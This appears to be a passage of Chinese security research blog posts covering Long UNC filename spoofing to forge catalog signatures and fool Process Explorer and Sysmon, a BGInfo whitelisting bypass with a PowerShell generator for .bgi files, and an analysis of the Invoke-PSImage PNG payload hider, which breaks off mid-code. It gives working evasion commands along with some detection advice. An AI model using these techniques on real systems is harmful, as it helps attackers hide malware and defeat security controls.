<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Long UNC基础知识</li>
  <li>Long UNC文件名欺骗的方法</li>
  <li>Long UNC文件名欺骗优缺点分析</li>
</ul>

<h2 id="0x02-long-unc介绍">0x02 Long UNC介绍</h2>
<hr>

<h3 id="uncuniversal-naming-convention">UNC（Universal Naming Convention）</h3>

<p>通用命名规则，可用来表示Windows系统中文件的位置</p>

<p>详细介绍可参考如下链接：</p>

<p>https://en.wikipedia.org/wiki/Path_(computing)</p>

<h3 id="long-unc">Long UNC</h3>

<p>正常UNC支持的最大长度为260字符</p>

<p>为了支持更长的字符，引入了Long UNC，支持最大长度为32767</p>

<p>格式举例： <code class="language-plaintext highlighter-rouge">\\?\C:\test\a.exe</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type putty.exe &gt; "\\?\C:\test\longUNC.exe"
</code></pre></div></div>

<p>如下图，使用Long UNC的文件同普通文件没有区别</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-17/2-1.png" alt="Alt text"></p>

<p><strong>特别用法：</strong></p>

<p>如果在Long UNC文件名后面加一个空格，系统对文件名的判断将发生错误</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type putty.exe &gt; "\\?\C:\test\mimikatz.exe "
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-17/2-2.png" alt="Alt text"></p>

<p>将putty.exe重命名为<code class="language-plaintext highlighter-rouge">"\\?\C:\test\mimikatz.exe "</code>，右键查看<code class="language-plaintext highlighter-rouge">"\\?\C:\test\mimikatz.exe "</code>的文件属性</p>

<p>发现了奇怪的地方：<strong>属性显示该文件为样本文件mimikatz.exe的属性</strong></p>

<p>直观理解：特殊Long UNC的文件能够欺骗系统，将其识别为另一个文件</p>

<h2 id="0x03-long-unc文件名欺骗的方法">0x03 Long UNC文件名欺骗的方法</h2>
<hr>

<p>由上节测试，我们知道利用Long UNC能够复制文件属性</p>

<p>那么，如果复制的是系统文件，甚至是带有catalog签名的文件，是否能实现catalog的签名伪造？</p>

<h3 id="测试1-伪造calcexe的catalog签名">测试1： 伪造calc.exe的catalog签名</h3>

<p>测试系统： Win7 x86</p>

<p>使用sigcheck.exe查看calc.exe的catalog签名：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigcheck.exe -i c:\windows\system32\calc.exe
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-17/3-1.png" alt="Alt text"></p>

<p>Long UNC文件伪造:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type putty.exe &gt; "\\?\C:\Windows\System32\calc.exe "
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>输出到<code class="language-plaintext highlighter-rouge">c:\windows\system32\</code>需要管理员权限</p>

<p>特殊文件名必须放在目标的同级目录下，即<code class="language-plaintext highlighter-rouge">C:\Windows\System32</code>，否则启动失败</p>

<p>如下图，验证结论，特殊Long UNC能够复制文件属性</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-17/3-2.png" alt="Alt text"></p>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Hidden-Alternative-Data-Streams%E7%9A%84%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/">《Hidden Alternative Data Streams的进阶利用技巧》</a>介绍过特殊文件名可用短文件名代替</p>

<p>获取短文件名：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /x calc*.exe
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-17/3-3.png" alt="Alt text"></p>

<p><code class="language-plaintext highlighter-rouge">"\\?\C:\Windows\System32\calc.exe "</code>可用短文件名CALC~1.EXE代替</p>

<p>使用sigcheck.exe查看该文件的catalog签名：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigcheck.exe -i "\\?\C:\Windows\System32\calc.exe "
</code></pre></div></div>

<p>or</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigcheck.exe -i C:\Windows\System32\CALC~1.EXE
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-17/3-4.png" alt="Alt text"></p>

<p>成功伪造catalog签名</p>

<h3 id="测试2-执行特殊long-unc文件">测试2： 执行特殊Long UNC文件</h3>

<p>1、无法双击执行</p>

<p>2、通过命令行</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"\\?\C:\Windows\System32\calc.exe "
</code></pre></div></div>

<p>提示系统找不到指定的路径</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\CALC~1.EXE
</code></pre></div></div>

<p>启动正常calc.exe</p>

<p>3、通过WMIC</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic process call create C:\Windows\System32\CALC~1.exe
</code></pre></div></div>

<p>4、通过vbs</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set objShell = CreateObject("Wscript.Shell")
objShell.Run "c:\windows\system32\calc~1.exe"
</code></pre></div></div>

<p>5、通过js</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var wsh=new ActiveXObject("wscript.shell");  
wsh.run("c:\\windows\\system32\\calc~1.exe");
</code></pre></div></div>

<p>启动后，进程名为calc~1.exe</p>

<p><strong>特别的地方：</strong></p>

<p>通过Process Explorer验证进程签名，识别为calc.exe的默认微软证书</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-17/3-5.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>关于文件的描述，例如截图中的<code class="language-plaintext highlighter-rouge">"SSH, Telnet and Rlogin client"</code>可通过修改程序的资源进行伪造，方法暂略</p>

<p>得出结论： <strong>执行特殊Long UNC文件能够欺骗Process Explorer的进程签名验证</strong></p>

<p><strong>补充：</strong></p>

<p>能够欺骗Sysmon的部分日志监控功能，例如Process creation</p>

<h3 id="测试3-无法欺骗的工具">测试3： 无法欺骗的工具</h3>

<p>1、使用certutil.exe计算MD5</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe -hashfile C:\Windows\System32\calc.exe MD5

certutil.exe -hashfile C:\Windows\System32\calc~1.exe MD5
</code></pre></div></div>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe -hashfile "\\?\C:\Windows\System32\calc.exe " MD5
</code></pre></div></div>

<p>报错提示系统找不到文件</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-17/3-6.png" alt="Alt text"></p>

<h3 id="测试4-多个同名文件夹的生成">测试4： 多个同名文件夹的生成</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type putty.exe &gt; "\\?\C:\Windows\System32\calc.exe "
type putty.exe &gt; "\\?\C:\Windows\System32\calc.exe  "
type putty.exe &gt; "\\?\C:\Windows\System32\calc.exe   "
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-17/3-7.png" alt="Alt text"></p>

<h3 id="测试5-特殊long-unc文件的删除">测试5： 特殊Long UNC文件的删除</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>del "\\?\C:\Windows\System32\calc.exe "
</code></pre></div></div>

<p>or</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>del C:\Windows\System32\CALC~1.exe
</code></pre></div></div>

<h3 id="测试6-其他系统测试">测试6： 其他系统测试</h3>

<p>支持Win7-Win10</p>

<p>64位系统需要注意重定向问题</p>

<h2 id="0x04-利用分析">0x04 利用分析</h2>
<hr>

<p>利用特殊Long UNC文件名欺骗系统对文件路径的判断，实现伪造catalog签名</p>

<p><strong>特点：</strong></p>

<p>欺骗系统对文件名的检查，将文件伪造成系统文件，伪造catalog签名</p>

<p><strong>防御检测：</strong></p>

<p>1、权限控制</p>

<p>欺骗系统文件，需要有系统文件夹的可写权限</p>

<p>2、文件识别</p>

<p>同级目录同名文件</p>

<p>3、进程名判断</p>

<p>特殊进程名，格式为短文件名，例如CALC~1.EXE</p>

<p>4、工具检测</p>

<p>使用certutil.exe校验文件hash</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了利用特殊Long UNC文件名欺骗系统并获得Catalog签名的技巧，分析利用方法，分享防御思路</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on October 17, 2017
  </div>

  
</article><article class="post">
  <h1>Study Notes of using BGInfo to bypass Application Whitelisting</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>最近看到一篇有趣的文章《Bypassing Application Whitelisting with BGInfo》，介绍了如何通过BGInfo实现白名单绕过，我对此很感兴趣，于是对这部分内容做了学习整理，同时开源了一个powershell脚本，用于自动生成.bgi文件</p>

<p>文章地址如下：</p>

<p>https://msitpros.com/?p=3831</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍如下内容：</p>

<ul>
  <li>Bginfo简介</li>
  <li>通过Bginfo绕过白名单的实际操作</li>
  <li>如何使用powershell编辑二进制文件</li>
  <li>如何开发powershell脚本自动生成.bgi文件</li>
</ul>

<h2 id="0x02-bginfo">0x02 Bginfo</h2>
<hr>

<p>Bginfo—强大的Windows系统信息显示工具,出自Sysinternals套件</p>

<p><strong>下载地址：</strong></p>

<p>https://technet.microsoft.com/en-us/sysinternals/bb897557.aspx</p>

<p><strong>注：</strong></p>

<p>bginfo.exe最新版本为4.22，本文测试版本为4.21</p>

<h3 id="1简介">1、简介</h3>

<p>可以自动在桌面的一个区域中显示当前Windows环境信息</p>

<p>面板如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/2-1.png" alt="Alt text"></p>

<p>设置后，桌面显示Windows环境信息，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/2-2.png" alt="Alt text"></p>

<p>编辑要显示的信息，可将其保存为<code class="language-plaintext highlighter-rouge">config.bgi</code>，使用时将其导入就好</p>

<h3 id="2bginfo命令行模式">2、Bginfo命令行模式</h3>

<p>/h 弹出帮助</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/2-3.png" alt="Alt text"></p>

<p>通过命令行设置桌面显示信息的命令如下：</p>

<p><code class="language-plaintext highlighter-rouge">bginfo.exe config.bgi /timer:0 /nolicprompt /silent</code></p>

<h3 id="3扩展">3、扩展：</h3>

<p>点击Custom可自定义桌面显示内容，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/2-4.png" alt="Alt text"></p>

<p>选择New</p>

<p>设置数据源，包括环境变量、注册表键值、WMI、文件、VB Script脚本</p>

<h3 id="4导入wmi查询">4、导入WMI查询：</h3>

<p>添加一个WMI查询，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/2-5.png" alt="Alt text"></p>

<p>在面部添加显示内容，修改桌面，成功显示新内容，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/2-6.png" alt="Alt text"></p>

<h3 id="5导入vbs">5、导入VBS：</h3>

<p>添加一个vbs查询,vbs脚本可参考：</p>

<p>https://gist.githubusercontent.com/api0cradle/efc90f8318556f0737791b6d73a4ec8b/raw/9a46f4cdacb5752e721e1e3701308939351b4768/gistfile1.txt</p>

<p>该vbs脚本实现：</p>

<ul>
  <li>启动cmd.exe</li>
  <li>在桌面输出：”Does not matter what this says”</li>
</ul>

<p>导入该vbs脚本后，点击Apply，成功弹出cmd.exe，并在桌面输出<code class="language-plaintext highlighter-rouge">Does not matter what this says</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/2-7.png" alt="Alt text"></p>

<p>整个启动过程还可在cmd下实现</p>

<p>(1) 将上述bgi工程保存为vbs.bgi</p>

<p>(2) cmd：</p>

<p><code class="language-plaintext highlighter-rouge">bginfo.exe vbs.bgi /timer:0 /nolicprompt /silent</code></p>

<h3 id="6bginfoexe和vbsbgi可以放在远程服务器通过网络共享访问执行">6、bginfo.exe和vbs.bgi可以放在远程服务器，通过网络共享访问执行</h3>

<p>cmd：</p>

<p><code class="language-plaintext highlighter-rouge">\\WIN-FVJLPTISCFE\test\bginfo.exe \\WIN-FVJLPTISCFE\test\test1.bgi /timer:0 /nolicprompt /silent</code></p>

<p>完整操作如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/3-1.gif" alt="Alt text"></p>

<h2 id="0x03-通过bginfo绕过白名单">0x03 通过Bginfo绕过白名单</h2>
<hr>

<p><strong>完整过程如下：</strong></p>

<p>1、启动bginfo.exe，添加导入vbs脚本功能，设置vbs脚本路径，去掉桌面显示内容</p>

<p>2、将bgi工程保存为.bgi文件</p>

<p>3、命令行执行代码：</p>

<p><code class="language-plaintext highlighter-rouge">bginfo.exe vbs.bgi /timer:0 /nolicprompt /silent</code></p>

<p><strong>注：</strong></p>

<p>bginfo.exe的版本需要低于4.22，版本4.22已经修复上述问题</p>

<p>整个绕过过程很简单，但是步骤1和步骤2比较麻烦，通过<code class="language-plaintext highlighter-rouge">UltraEdit</code>查看vbs.bgi，内容如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/4-1.png" alt="Alt text"></p>

<p>看起来遵循一定的格式，那么能否通过powershell脚本实现自动生成.bgi文件呢？</p>

<h2 id="0x04-bgi文件格式">0x04 bgi文件格式</h2>
<hr>

<p>通过文件比较来猜测bgi文件格式</p>

<p>使用16进制文件比较工具：<code class="language-plaintext highlighter-rouge">Beyond Compare</code></p>

<p>分别设置不同的vbs路径，对比差别，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/4-2.png" alt="Alt text"></p>

<p>不难发现，差异只存在于0x00000301和0x00000306开始的vbs路径</p>

<p>0x00000000-0x0x00000300为固定格式</p>

<p>字符串<code class="language-plaintext highlighter-rouge">C：\test\1.vbs</code>的长度为13，0x00000301标志位数值为0x0F，10进制为15</p>

<p>字符串<code class="language-plaintext highlighter-rouge">C：\test\cmd.vbs</code>的长度为15，0x00000301标志位数值为0x11，10进制为17</p>

<p><strong>大胆猜测：</strong></p>

<p>0x00000301的标志位表示内容为：vbs路径长度+2，并转换成16进制保存</p>

<p><strong>注：</strong></p>

<p>vbs路径<code class="language-plaintext highlighter-rouge">C：\test\1.vbs</code>中的磁盘目录<code class="language-plaintext highlighter-rouge">C</code>需要大写，否则提示文件格式错误</p>

<h2 id="0x05-如何使用powershell编辑二进制文件">0x05 如何使用powershell编辑二进制文件</h2>
<hr>

<p>使用powershell读写文件，最常用的方式为：</p>

<p>读文件： <code class="language-plaintext highlighter-rouge">Get-content</code>
写文件： <code class="language-plaintext highlighter-rouge">Set-content</code></p>

<p>然而，对于不是txt的文件，如果存在特殊字符，通过以上方法会出现bug，自动过滤特殊字符串，导致长度不同，内容出错</p>

<p>读写二进制文件方法：</p>

<p>读二进制文件：</p>

<p><code class="language-plaintext highlighter-rouge">[System.IO.File]::ReadAllBytes('1.txt')</code></p>

<p>写二进制文件：</p>

<p><code class="language-plaintext highlighter-rouge">[System.IO.File]::WriteAllBytes("1.txt",$fileContentBytes)</code></p>

<p>修改二进制文件：</p>

<p>使用<code class="language-plaintext highlighter-rouge">system.io.filestream</code></p>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$fs=new-object io.filestream "test1.bgi",open
$fs.seek(0,2)
$fs.writebyte(0x00)
$fs.flush()
$fs.close()
</code></pre></div></div>

<p><strong>参数说明：</strong></p>

<p>$fs=new-object io.filestream “test1.bgi”,open：</p>

<ul>
  <li>open表示追加，createnew表示新建</li>
</ul>

<p>$fs.seek(0,2)：</p>

<ul>
  <li>第一个参数表示偏移</li>
  <li>第二个参数：0表示以文件开头作为起点，1表示以当前位置作为起点，2表示以文件末尾作为起点</li>
</ul>

<h2 id="0x06-编写powershell脚本实现自动生成bgi文件">0x06 编写powershell脚本实现自动生成.bgi文件</h2>
<hr>

<p><strong>开发思路：</strong></p>

<p>读取0x00000000-0x0x00000300内容，作base64编码并保存在变量$fileContent中</p>

<p>对变量$fileContent作base64解码，写入新文件test1.bgi</p>

<p>使用追加方式向文件依次写入标志位，vbs路径和其他填充位</p>

<p><strong>流程如下:</strong></p>

<ul>
  <li>写入0x00000000-0x0x00000300内容</li>
  <li>计算标志位</li>
  <li>以二进制方式写入标志位</li>
  <li>使用Out-File向文件追加写入vbs路径，但是会存在冗余数据0D0A</li>
  <li>偏移-2，以二进制方式填充其他位置，覆盖冗余数据0D0A</li>
</ul>

<p><strong>关键代码如下:</strong></p>

<p>将0x00000000-0x0x00000300内容保存为1.bgi</p>

<p>powershell代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$fileContent = [System.IO.File]::ReadAllBytes('1.bgi')
$fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content ("buffer.txt") 
</code></pre></div></div>

<p>生成buffer.txt，内容如下：</p>

<p><code class="language-plaintext highlighter-rouge">CwAAAEJhY2tncm91bmQABAAAAAQAAAAAAAAACQAAAFBvc2l0aW9uAAQAAAAEAAAA/gMAAAgAAABNb25pdG9yAAQAAAAEAAAAXAQAAA4AAABUYXNrYmFyQWRqdXN0AAQAAAAEAAAAAQAAAAsAAABUZXh0V2lkdGgyAAQAAAAEAAAAwHsAAAsAAABPdXRwdXRGaWxlAAEAAAASAAAAJVRlbXAlXEJHSW5mby5ibXAACQAAAERhdGFiYXNlAAEAAAABAAAAAAwAAABEYXRhYmFzZU1SVQABAAAABAAAAAAAAAAKAAAAV2FsbHBhcGVyAAEAAAABAAAAAA0AAABXYWxscGFwZXJQb3MABAAAAAQAAAACAAAADgAAAFdhbGxwYXBlclVzZXIABAAAAAQAAAABAAAADQAAAE1heENvbG9yQml0cwAEAAAABAAAAAAAAAAMAAAARXJyb3JOb3RpZnkABAAAAAQAAAAAAAAACwAAAFVzZXJTY3JlZW4ABAAAAAQAAAABAAAADAAAAExvZ29uU2NyZWVuAAQAAAAEAAAAAAAAAA8AAABUZXJtaW5hbFNjcmVlbgAEAAAABAAAAAAAAAAOAAAAT3BhcXVlVGV4dEJveAAEAAAABAAAAAAAAAAEAAAAUlRGAAEAAADvAAAAe1xydGYxXGFuc2lcYW5zaWNwZzkzNlxkZWZmMFxkZWZsYW5nMTAzM1xkZWZsYW5nZmUyMDUye1xmb250dGJse1xmMFxmbmlsXGZjaGFyc2V0MTM0IEFyaWFsO319DQp7XGNvbG9ydGJsIDtccmVkMjU1XGdyZWVuMjU1XGJsdWUyNTU7fQ0KXHZpZXdraW5kNFx1YzFccGFyZFxmaS0yODgwXGxpMjg4MFx0eDI4ODBcY2YxXGxhbmcyMDUyXGJccHJvdGVjdFxmMFxmczI0IDx2YnM+XHByb3RlY3QwXHBhcg0KXHBhcg0KfQ0KAAALAAAAVXNlckZpZWxkcwAAgACAAAAAAAQAAAB2YnMAAQAAAA==</code></p>

<p>将其保存在变量$fileContent中，解密并写入文件test1.bgi</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$fileContent = "CwAAAEJhY2tncm91bmQABAAAAAQAAAAAAAAACQAAAFBvc2l0aW9uAAQAAAAEAAAA/gMAAAgAAABNb25pdG9yAAQAAAAEAAAAXAQAAA4AAABUYXNrYmFyQWRqdXN0AAQAAAAEAAAAAQAAAAsAAABUZXh0V2lkdGgyAAQAAAAEAAAAwHsAAAsAAABPdXRwdXRGaWxlAAEAAAASAAAAJVRlbXAlXEJHSW5mby5ibXAACQAAAERhdGFiYXNlAAEAAAABAAAAAAwAAABEYXRhYmFzZU1SVQABAAAABAAAAAAAAAAKAAAAV2FsbHBhcGVyAAEAAAABAAAAAA0AAABXYWxscGFwZXJQb3MABAAAAAQAAAACAAAADgAAAFdhbGxwYXBlclVzZXIABAAAAAQAAAABAAAADQAAAE1heENvbG9yQml0cwAEAAAABAAAAAAAAAAMAAAARXJyb3JOb3RpZnkABAAAAAQAAAAAAAAACwAAAFVzZXJTY3JlZW4ABAAAAAQAAAABAAAADAAAAExvZ29uU2NyZWVuAAQAAAAEAAAAAAAAAA8AAABUZXJtaW5hbFNjcmVlbgAEAAAABAAAAAAAAAAOAAAAT3BhcXVlVGV4dEJveAAEAAAABAAAAAAAAAAEAAAAUlRGAAEAAADvAAAAe1xydGYxXGFuc2lcYW5zaWNwZzkzNlxkZWZmMFxkZWZsYW5nMTAzM1xkZWZsYW5nZmUyMDUye1xmb250dGJse1xmMFxmbmlsXGZjaGFyc2V0MTM0IEFyaWFsO319DQp7XGNvbG9ydGJsIDtccmVkMjU1XGdyZWVuMjU1XGJsdWUyNTU7fQ0KXHZpZXdraW5kNFx1YzFccGFyZFxmaS0yODgwXGxpMjg4MFx0eDI4ODBcY2YxXGxhbmcyMDUyXGJccHJvdGVjdFxmMFxmczI0IDx2YnM+XHByb3RlY3QwXHBhcg0KXHBhcg0KfQ0KAAALAAAAVXNlckZpZWxkcwAAgACAAAAAAAQAAAB2YnMAAQAAAA=="
$fileContentBytes = [System.Convert]::FromBase64String($fileContent) 
[System.IO.File]::WriteAllBytes("test1.bgi",$fileContentBytes)
</code></pre></div></div>

<p>标志位计算：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$VbsPath="C:\test\1.vbs"
$Length=$VbsPath.Length+2
</code></pre></div></div>

<p>写入长度标志位+空闲填充位</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$fs=new-object io.filestream "test1.bgi",open
$fs.seek(0,2)
$fs.writebyte($Length)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x34)
$fs.flush()
$fs.close()
</code></pre></div></div>

<p>追加写入vbs脚本路径：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$VbsPath | Out-File -Encoding ascii -Append test1.bgi
</code></pre></div></div>

<p>存在冗余数据0D0A，所以偏移应该为-2，写入空闲填充位：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$fs=new-object io.filestream "test1.bgi",open
$fs.seek(-2,2)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x01)
$fs.writebyte(0x80)
$fs.writebyte(0x00)
$fs.writebyte(0x80)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.flush()
$fs.close()
</code></pre></div></div>

<p>完整代码已上传至github：</p>

<p>https://github.com/3gstudent/bgi-creater</p>

<p>完整操作如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/5-1.gif" alt="Alt text"></p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了通过BGInfo实现白名单绕过的方法，同时介绍了通过powershell编辑二进制文件的方法，开源了一个powershell生成.bgi文件的脚本，希望能够帮助大家</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on May 25, 2017
  </div>

  
</article><article class="post">
  <h1>Invoke-PSImage利用分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>最近在github看见一个有趣的项目：<a href="https://github.com/peewpw/Invoke-PSImage">Invoke-PSImage</a>，在png文件的像素内插入powershell代码作为payload(不影响原图片的正常浏览)，在命令行下仅通过一行powershell代码就能够执行像素内隐藏的payload</p>

<p>这是一种隐写(Steganography)技术的应用，我在之前的文章对png的隐写技术做了一些介绍，可供参考：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-PNG%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84LSB%E9%9A%90%E5%86%99/">《隐写技巧——PNG文件中的LSB隐写》</a></p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/">《隐写技巧——利用PNG文件格式隐藏Payload》</a></p>

<p>本文将结合自己的一些心得对Invoke-PSImage进行分析，介绍原理，解决测试中遇到的问题，学习脚本中的编程技巧，提出自己的优化思路</p>

<p>Invoke-PSImage地址：</p>

<p>https://github.com/peewpw/Invoke-PSImage</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>脚本分析</li>
  <li>隐写原理</li>
  <li>实际测试</li>
  <li>编程技巧</li>
  <li>优化思路</li>
</ul>

<h2 id="0x02-脚本分析">0x02 脚本分析</h2>
<hr>

<h3 id="1参考说明文件">1、参考说明文件</h3>

<p>https://github.com/peewpw/Invoke-PSImage/blob/master/README.md</p>

<p>(1) 选取每个像素的两个颜色中的4位用于保存payload</p>

<p>(2) 图像质量将受到影响</p>

<p>(3) 输出格式为png</p>

<h3 id="2参考源代码对上述说明进行分析">2、参考源代码对上述说明进行分析</h3>

<p>(1) 像素使用的为RGB模式，分别选取颜色分量中的G和B的低4位(共8位)保存payload</p>

<p>(2) 由于同时替换了G和B的低4位，故图片质量会受影响</p>

<p><strong>补充：</strong></p>

<p>LSB隐写是替换RGB三个分量的最低1位，人眼不会注意到前后变化，每个像素可以存储3位的信息</p>

<p>猜测Invoke-PSImage选择每个像素存储8位是为了方便实现(8位=1字节)，所以选择牺牲了图片质量</p>

<p>(3) 输出格式为png，需要无损</p>

<p>png图片为无损压缩(bmp图片也是无损压缩)，jpg图片为有损压缩。所以在实际测试过程，输入jpg图片，输出png图片，会发现png图片远远大于jpg图片的大小</p>

<p>(4) 需要注意payload长度，每个像素保存一个字节，像素个数需要大于payload的长度</p>

<h2 id="0x03-隐写原理">0x03 隐写原理</h2>
<hr>

<p>参照源代码进行举例说明(跳过读取原图片的部分)</p>

<h3 id="1修改像素的rgb值替换为payload">1、修改像素的RGB值，替换为payload</h3>

<p>代码起始位置：</p>

<p>https://github.com/peewpw/Invoke-PSImage/blob/master/Invoke-PSImage.ps1#L110</p>

<p>对for循环做一个简单的修改，假定需要读取<code class="language-plaintext highlighter-rouge">0x73</code>，将其写入第一个像素<code class="language-plaintext highlighter-rouge">RGB(0x67,0x66,0x65)</code></p>

<h4 id="1-读取payload">（1） 读取payload</h4>

<p><strong>代码：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$paybyte1 = [math]::Floor($payload[$counter]/16)
</code></pre></div></div>

<p><strong>说明：</strong></p>

<p><code class="language-plaintext highlighter-rouge">$payload[$counter]/16</code>表示<code class="language-plaintext highlighter-rouge">$payload[$counter]/0x10</code></p>

<p>即取0x73/0x10，取商，等于0x07</p>

<p>所以，$paybyte1 = 0x07</p>

<p><strong>代码：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$paybyte2 = ($payload[$counter] -band 0x0f)
</code></pre></div></div>

<p><strong>说明：</strong></p>

<p>即0x73 &amp; 0x0f，结果为0x03</p>

<p>所以，$paybyte2 = 0x03</p>

<p><strong>代码：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$paybyte3 = ($randb[($counter+2)%109] -band 0x0f)
</code></pre></div></div>

<p><strong>说明：</strong></p>

<p>作随机数填充，$paybyte3可忽略</p>

<p><strong>注：</strong></p>

<p>原代码会将payload的长度和图片的像素长度进行比较，图片多出来的像素会以同样格式被填充成随机数</p>

<h4 id="2-向原像素赋值添加payload">（2） 向原像素赋值，添加payload</h4>

<p>原像素为<code class="language-plaintext highlighter-rouge">RGB(0x62,0x61,0x60)</code></p>

<p><strong>代码：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$rgbValues[($counter*3)] = ($rgbValues[($counter*3)] -band 0xf0) -bor $paybyte1
</code></pre></div></div>

<p><strong>说明：</strong></p>

<table>
  <tbody>
    <tr>
      <td>即0x60 &amp; 0xf0</td>
      <td>0x07</td>
    </tr>
  </tbody>
</table>

<p>所以，$rgbValues[0] = 0x67</p>

<p><strong>代码：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$rgbValues[($counter*3+1)] = ($rgbValues[($counter*3+1)] -band 0xf0) -bor $paybyte2
</code></pre></div></div>

<p><strong>说明：</strong></p>

<table>
  <tbody>
    <tr>
      <td>即0x61 &amp; 0xf0</td>
      <td>0x03</td>
    </tr>
  </tbody>
</table>

<p>所以，$rgbValues[1] = 0x63</p>

<p><strong>代码：</strong></p>

